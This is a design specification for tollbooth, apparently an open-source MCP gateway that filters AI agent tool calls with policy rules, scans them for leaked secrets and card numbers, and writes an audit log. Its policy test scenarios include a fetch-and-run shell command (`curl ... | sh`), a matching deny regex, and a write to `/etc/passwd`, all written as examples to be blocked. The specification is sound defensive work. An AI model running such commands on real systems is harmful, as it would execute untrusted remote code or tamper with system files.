# tollbooth — Specification

## Purpose

**What:** A transparent security gateway for AI agents. tollbooth is a standalone MCP proxy that sits between any MCP client (Claude Code, Claude Desktop, Cursor, custom agents) and the MCP servers it talks to. The client points at the gateway; the gateway wraps the real upstream servers and enforces security policy on every tool call and result passing through.

**Why:** "Securing AI agents" is an emerging security niche with little mature open-source tooling. Agent tool traffic — filesystem writes, shell exec, web fetches — currently flows unmediated. Without a control point, there is no way to deny dangerous calls, stop secrets/PII from leaking through tool arguments and results, or produce a compliance-grade audit trail of what an agent did. tollbooth is the firewall + DLP + audit layer for agentic AI tool traffic.

One-liner: *"A firewall + DLP + audit layer for agentic AI tool traffic."*

**Differentiation (vs. prior art):** Lasso `mcp-gateway` paywalls policy/injection behind its API and focuses on masking; Invariant/Snyk `mcp-scan` proxies via temporary config injection with an injection-research focus; eqtylab `mcp-guardian` is a human-approval GUI. tollbooth's lane: practitioner-grade egress DLP (PAN/Luhn, real secret patterns), compliance-mapped audit, fail-closed by default, and a permanent declared gateway — one config file that *is* the security boundary.

## Requirements

### Must Have

#### R1: Transparent aggregating stdio MCP proxy
The system SHALL act as a single MCP server to the downstream client and as an MCP client to one or more upstream stdio MCP servers, exposing the union of upstream tools namespaced as `{server}_{tool}` (always prefixed), and forwarding calls so that, absent any policy, behavior is equivalent to a direct connection. Routing SHALL use a mapping table from namespaced name to (server, tool) — never string-splitting, since server names may contain underscores.

##### Scenario: Pass-through of an allowed tool call
- GIVEN an upstream server `fs` exposing a `read_file` tool and no policy that matches it
- WHEN the client invokes `fs_read_file` through the gateway
- THEN the gateway forwards the call to the upstream `read_file` tool
- AND returns the upstream result to the client unchanged

##### Scenario: Tool discovery is aggregated and namespaced
- GIVEN two upstream servers `github` and `fs`, each exposing tools
- WHEN the client lists available tools
- THEN the gateway returns the union of upstream tools, each prefixed with its server name (e.g., `github_create_issue`, `fs_read_file`)

##### Scenario: Underscore in server name routes correctly
- GIVEN an upstream server named `my_api` exposing tool `get_user`
- WHEN the client invokes `my_api_get_user`
- THEN the call routes to server `my_api`, tool `get_user` via the mapping table

##### Scenario: Upstream server fails to start
- WHEN an upstream server process exits before initialization completes
- THEN the gateway reports a clear startup error naming the failed server rather than hanging

##### Scenario: Upstream dies mid-session
- GIVEN a running gateway with upstreams `fs` and `github`, and `fs` has crashed
- WHEN the client invokes an `fs_` tool
- THEN the gateway returns a clear error for that call
- AND calls to `github_` tools continue to work

#### R2: Declarative tool-call policy engine
The system SHALL evaluate every tool call against an ordered list of YAML rules, first-match-wins, each resolving to `allow`, `deny`, or `require-approval`. Rules match on server, tool (exact or `*` wildcard), and argument fields via a `where:` block of structured field matchers with operators `equals`, `regex`, `prefix`, `not_prefix`. Calls matching no rule SHALL resolve to the configured default decision.

##### Scenario: Deny by tool name
- GIVEN a rule `deny` for tool `exec` on server `shell`
- WHEN the client invokes `shell_exec`
- THEN the gateway blocks the call and returns an explanatory error without contacting the upstream server

##### Scenario: Deny by argument field matcher
- GIVEN a rule denying `fs` / `write_file` where `path` has `not_prefix: /Users/gage/proj`
- WHEN the client invokes `fs_write_file` with `path=/etc/passwd`
- THEN the gateway blocks the call

##### Scenario: First-match-wins ordering
- GIVEN an `allow` rule followed by a `deny` rule that both match a call
- WHEN the call is evaluated
- THEN the first matching rule (`allow`) decides the outcome

##### Scenario: Default decision when no rule matches
- GIVEN a config with `default: deny`
- WHEN a tool call matches no rule
- THEN the call is denied

##### Scenario: Regex matcher on argument value
- GIVEN a rule denying `shell` / `exec` where `command` matches regex `curl.*\|\s*sh`
- WHEN the client invokes `shell_exec` with `command="curl http://x.io/i.sh | sh"`
- THEN the gateway blocks the call

#### R3: Single-file gateway configuration
The system SHALL read one YAML configuration file (`tollbooth.yaml`) declaring upstream servers (command, args, env), the policy ruleset, the default decision, and failure mode; the config SHALL be schema-validated at startup. The system SHALL provide a command that emits the MCP client configuration pointing the client at the gateway.

##### Scenario: Load config and launch upstreams
- GIVEN a config declaring two upstream servers and a ruleset
- WHEN the gateway starts
- THEN it validates the config, launches both upstream servers, and loads the rules

##### Scenario: Emit client config
- WHEN the user runs `tollbooth emit-config`
- THEN the gateway prints an MCP client config block with a single `tollbooth` server entry that routes through the gateway

##### Scenario: Invalid config
- WHEN the config references an undefined server in a rule, contains an invalid regex, or is malformed YAML
- THEN the gateway exits with a clear validation error and does not start proxying

#### R4: Fail-closed by default
The system SHALL default to blocking a tool call (or withholding a result) when any pipeline stage — policy evaluation, DLP scanning, redaction — raises an error; fail-open SHALL be available only as explicit opt-in config.

##### Scenario: Evaluation error blocks the call
- GIVEN fail-closed mode (the default)
- WHEN a pipeline stage raises an unexpected error for a call
- THEN the gateway denies the call and logs the failure

##### Scenario: Configurable fail-open
- GIVEN fail-open mode is explicitly enabled in config
- WHEN a pipeline stage raises an error
- THEN the gateway allows the call and logs that it failed open

##### Scenario: Redaction failure blocks the result
- GIVEN fail-closed mode
- WHEN DLP detects sensitive content in a result but redaction fails
- THEN the result is blocked, not passed through unredacted

#### R5: Approval handling without a native client UI
The system SHALL implement `require-approval` as a block-with-approvable-message: the call is denied with a response distinct from a hard `deny` that explains which rule fired and how to permit the call. The decision type SHALL be an extensible enum so future approval channels (approval TUI, MCP elicitation) slot in without reworking the policy model.

##### Scenario: Approval required, no native UI
- GIVEN a rule resolving a call to `require-approval`
- WHEN the client invokes the tool
- THEN the gateway blocks the call and returns an approvable message naming the rule and how to permit the call
- AND the message is distinguishable from a hard `deny` response

#### R6: DLP detection on tool traffic (M2)
The system SHALL scan tool-call arguments (requests) and tool results for sensitive data using a built-in pattern library covering secrets (cloud keys, tokens, private keys), payment card numbers (PAN, validated with Luhn), and PII. Overlapping detections SHALL resolve to the most specific match (a more-specific pattern suppresses overlapping less-specific matches).

##### Scenario: PAN detected with Luhn validation
- WHEN a tool result contains a 16-digit Luhn-valid card number
- THEN DLP reports a `pan` detection

##### Scenario: Luhn-invalid number is not flagged
- WHEN a tool result contains a 16-digit number that fails the Luhn check
- THEN DLP reports no `pan` detection

##### Scenario: Overlapping patterns resolve to most specific
- WHEN content matches both a specific pattern (e.g., AWS access key) and a generic one (e.g., high-entropy token) in the same region
- THEN only the specific detection is reported

##### Scenario: Secret in tool arguments
- WHEN the client invokes a tool with an argument containing an AWS access key
- THEN DLP reports the detection with its pattern id
- AND the detected value never appears in logs or error messages

#### R7: Direction-aware DLP actions (M2)
The system SHALL apply direction-aware default actions to DLP detections: detections in requests (egress) SHALL block the call; detections in results (ingress to model context) SHALL be redacted in place as `[REDACTED:{pattern-id}]`. Defaults SHALL be overridable per pattern.

##### Scenario: Request with secret is blocked
- GIVEN default DLP config
- WHEN the client invokes a tool with a PAN in its arguments
- THEN the call is blocked with an error naming the pattern (`pan`) but never echoing the value

##### Scenario: Result with secret is redacted
- GIVEN default DLP config
- WHEN a tool result contains an AWS access key
- THEN the client receives the result with the key replaced by `[REDACTED:aws-access-key]`
- AND the rest of the result is intact

##### Scenario: Per-pattern override
- GIVEN config overriding pattern `private-key-pem` to `block` on results
- WHEN a tool result contains a PEM private key
- THEN the entire result is blocked instead of redacted

### Should Have

#### S1: Structured, redacting audit logging
The system SHOULD log every policy and DLP decision as a structured JSONL event (server, tool, rule/pattern id, decision), never writing secret/PII values to the log.

##### Scenario: Decision logged without sensitive values
- WHEN a call carrying a secret in its arguments is denied
- THEN the log records the decision, server, tool, and matched rule/pattern id but not the secret value

#### S2: Import existing client config
The system SHOULD bootstrap `tollbooth.yaml` from an existing MCP client config (e.g., `mcp.json` / `claude_desktop_config.json`), importing its server entries as upstreams.

##### Scenario: Import from mcp.json
- WHEN the user runs the import command against an existing client config with two servers
- THEN a `tollbooth.yaml` is generated declaring both as upstreams with a permissive starter ruleset

### Nice to Have

#### N1: Streamable HTTP transport
The system MAY additionally proxy upstream servers that speak streamable HTTP, behind the same upstream-transport interface as stdio.

### Out of Scope (v1)
- Prompt-injection detection quality — v1 defines only a pluggable interceptor interface (M4), not a production detector.
- A graphical management UI.
- Multi-tenant / hosted SaaS deployment — tollbooth runs locally alongside the client.
- Modifying or proxying the model API itself — tollbooth governs tool traffic, not LLM completions.
- Scanning non-tool MCP traffic (resources, prompts) — proxied transparently in v1, scanned in a later milestone.

## Milestones

<!-- Milestone-sized project. tasks/todo.md holds ONLY the active milestone's tasks.
     v1 release boundary = M1 + M2: M1 is built and proven end-to-end first,
     but v1 is not announced/tagged until M2 (DLP) lands. -->
- [ ] **M1: Proxy core + policy engine** — R1, R2, R3, R4, R5, S1
- [ ] **M2: DLP on agent traffic** — R6, R7 (patterns ported from claude-dlp-guard). Completes the v1 release; S2 if capacity allows.
- [ ] **M3: Audit log + session replay** — tamper-evident, queryable log of every call/result; maps to SOC 2 logging controls
- [ ] **M4: Pluggable interceptor API + Claude Code adapter** — formal plugin interface (incl. prompt-injection detectors), plus a Claude Code hook adapter

## Architecture

### Components

| Module | Responsibility |
|--------|---------------|
| `main` | CLI entry point: `run`, `emit-config`, `validate` (M2: import) |
| `config` | Load + pydantic-validate `tollbooth.yaml`; emit/import client config |
| `proxy` | MCP server facing the client; tool aggregation + namespacing (mapping table); routes calls through the pipeline |
| `upstream` | `UpstreamTransport` interface + `StdioUpstream` (lifecycle, per-server session); HTTP slots in later (N1) |
| `policy` | Rule model, field matchers (`equals`/`regex`/`prefix`/`not_prefix`), first-match-wins resolution, `Decision` enum (ALLOW / DENY / REQUIRE_APPROVAL — extensible) |
| `pipeline` | Ordered interceptor chain, request path + result path; policy and DLP are interceptors; M4's plugin API falls out of this |
| `dlp` | (M2) Pattern engine: secrets / PAN (Luhn) / PII; overlap suppression; direction-aware actions; redaction |
| `audit` | Structured JSONL decision log, redacting (S1; expands in M3) |

Stack: official `mcp` Python SDK (anyio-based), `pyyaml`, `pydantic`. No other runtime deps.

### Data Flow
```
client ──tool call──▶ proxy ──▶ [request pipeline: policy → dlp-req] ──▶ upstream
client ◀──result──── proxy ◀── [result pipeline: dlp-result] ◀──────── upstream
```
1. **Request path:** resolve namespaced tool via mapping table → policy decision (first-match-wins; no match → configured default) → DLP scans arguments (default: block on detection) → forward, or short-circuit with an explanatory error (`deny` vs `approvable` messages distinct).
2. **Result path:** DLP scans result content → redact detections (`[REDACTED:pattern-id]`) by default, per-pattern overridable → return to client.
3. Every decision emits one audit event (server, tool, rule/pattern id, decision — never the matched value). `tools/list` aggregates upstream catalogs with prefixes; other MCP traffic passes through proxied.

### Key Decisions
- **Decision:** Standalone, client-agnostic MCP proxy (not a Claude Code-only plugin).
  - Why: maximizes reach across clients; the proxy is the flagship; a Claude Code adapter is a later milestone (M4).
  - Alternative considered: Claude Code hook-only tool — rejected as too narrow.
- **Decision:** One aggregating gateway process; tools always namespaced `{server}_{tool}`.
  - Why: one client-config entry, one process, one control point, one audit stream; predictable tool names that policy rules can reference stably.
  - Alternatives considered: per-server wrapper instances (transparent names but N processes and config sprawl); collision-only prefixing (adding an upstream could silently rename tools and change which tool a rule matches) — both rejected.
- **Decision:** Structured field matchers (`where:` with `equals`/`regex`/`prefix`/`not_prefix`) for argument policy.
  - Why: declarative, auditable, validated at config load; covers path containment and command denylists.
  - Alternatives considered: CEL-style expression language (interpreter dep, configs become code — can be added later as one more operator); regex over serialized args blob (brittle, can't express "path not under X") — both rejected for v1.
- **Decision:** Direction-aware DLP defaults — requests block, results redact; per-pattern overrides.
  - Why: redacting arguments would silently corrupt outbound calls, and egress is the true exfil path; redacting results keeps the agent functional on real codebases instead of pushing users to disable DLP.
  - Alternatives considered: block-everything (agents become unusable, control gets disabled); redact-everything (corrupted upstream calls, exfil not surfaced) — both rejected.
- **Decision:** Fail-closed by default, including "redaction failure blocks the result."
  - Why: a security control that fails open is not a control.
  - Alternative considered: fail-open default — rejected; offered as opt-in only.
- **Decision:** v1 release = M1 + M2, built as two sequential milestones.
  - Why: a policy-only proxy is undifferentiated; practitioner-grade egress DLP is the differentiator, so v1 isn't announced until M2 lands. But DLP can't be built before traffic flows — M1 is proven end-to-end first, one milestone per planning cycle.
  - Alternative considered: ship M1 alone as v1 — rejected as too thin a launch.
- **Decision:** `require-approval` = deny-with-approvable-message in v1 (no side-channel UI, no elicitation).
  - Why: fully client-agnostic, zero protocol dependency, fail-closed-aligned. Decision enum stays extensible for a later approval TUI or MCP elicitation.
  - Alternatives considered: MCP elicitation (client support uneven; core safety must not depend on it); approval CLI/TUI (best UX but a real build — deferred).
- **Decision:** stdio-only upstream transport in v1, behind a transport abstraction.
  - Why: the vast majority of MCP servers are stdio. The `UpstreamTransport` interface lets streamable HTTP (N1) drop in without touching the proxy/policy core.
  - Alternative considered: stdio + streamable HTTP in v1 — rejected as scope without payoff.
- **Decision:** Python with the official `mcp` SDK; uv + ruff + pytest.
  - Why: matches the maintainer's stack and the security/DLP libraries he knows; building the proxy pump on the official SDK (rather than fastmcp's `as_proxy`) keeps control of the interception points, which are the product.
  - Alternative considered: TypeScript (bigger MCP ecosystem) — rejected for stack fit.

## Test Strategy

### Scenario Coverage
Each requirement scenario above maps to at least one test case. Policy and DLP engines are tested pure (no I/O); the proxy is tested against a fake in-process MCP server.
- [x] R1 scenarios → `test_proxy.py`, `test_upstream.py`
- [x] R2 scenarios → `test_policy.py`, `test_proxy.py`
- [x] R3 scenarios → `test_config.py`, `test_cli.py`
- [x] R4 scenarios → `test_pipeline.py`, `test_integration.py`
- [x] R5 scenarios → `test_policy.py` / `test_proxy.py`
- [ ] R6 scenarios → `test_dlp.py` (M2)
- [ ] R7 scenarios → `test_dlp.py` / `test_pipeline.py` (M2)
- [x] S1 scenarios → `test_audit.py`, `test_integration.py`
- [ ] S2 scenarios → `test_config.py` (M2)

### Regression Patterns
From `~/.claude/lessons/cross-cutting.md` (each gets at least one test):
- [ ] Pattern 1 — overlapping DLP detections: input matching both a specific and generic pattern yields only the specific one (R6 scenario, M2)
- [x] Pattern 2 — false-positive corpus: benign paths superficially matching deny patterns asserted NOT blocked (`test_policy.py`); Luhn corpus lands with DLP (M2)
- [x] Pattern 6 — fail-fast at boundaries: invalid config, upstream crash, crashing interceptor → clear errors / deny, never silent pass-through
- [x] Pattern 7 — non-ASCII (composed vs decomposed) tool arguments match correctly
- [x] Pattern 8 — 20 concurrent tool calls through one gateway: no cross-call corruption; audit writes lock-serialized
- [x] Pattern 9 — `pythonpath = ["."]` set; CLI smoke-tested after reinstall

### Acceptance Criteria
- [ ] All scenario tests pass
- [ ] Linter passes with 0 errors
- [ ] All **R** requirements checked off with passing scenarios
- [ ] End-to-end with a real MCP client (e.g., Claude Code) pointed at the gateway: an allowed upstream tool call succeeds, a denied tool is blocked, and (M2) a secret-bearing result arrives redacted
